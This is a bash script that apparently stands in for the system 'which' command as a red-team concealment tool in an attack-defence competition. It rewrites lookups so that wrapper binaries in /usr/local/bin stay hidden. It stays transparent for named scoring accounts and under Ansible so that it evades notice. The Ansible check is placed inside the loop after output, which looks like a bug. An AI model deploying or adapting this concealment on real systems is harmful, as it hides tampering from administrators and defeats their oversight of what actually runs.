#!/bin/bash
REAL_WHICH="/usr/bin/which"

# Pass straight through for gray team scoring accounts
case "$(whoami)" in
    kingneptune|paintythepirate|greyteamadmin) exec $REAL_WHICH "$@" ;;
esac


FOUND=0
for arg in "$@"; do
    [[ "$arg" == -* ]] && continue
    result=$("$REAL_WHICH" "$arg" 2>/dev/null)
    if [ -n "$result" ]; then
        # Rewrite /usr/local/bin/X -> real binary path
        # so the wrapper's presence in PATH is invisible
        fixed=$(echo "$result" | sed 's|/usr/local/bin/||')
        cmd=$(basename "$fixed")
        # Try /usr/bin first, then /usr/sbin
        if [ -x "/usr/bin/$cmd" ]; then
            echo "/usr/bin/$cmd"
        elif [ -x "/usr/sbin/$cmd" ]; then
            echo "/usr/sbin/$cmd"
        elif [ -x "/bin/$cmd" ]; then
            echo "/bin/$cmd"
        elif [ -x "/sbin/$cmd" ]; then
            echo "/sbin/$cmd"
        else
            # Fallback: just strip /usr/local/bin prefix and return whatever we get
            echo "$fixed"
        fi
        FOUND=1
    fi

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_WHICH "$@"
fi
done

[ $FOUND -eq 1 ] && exit 0 || exit 1
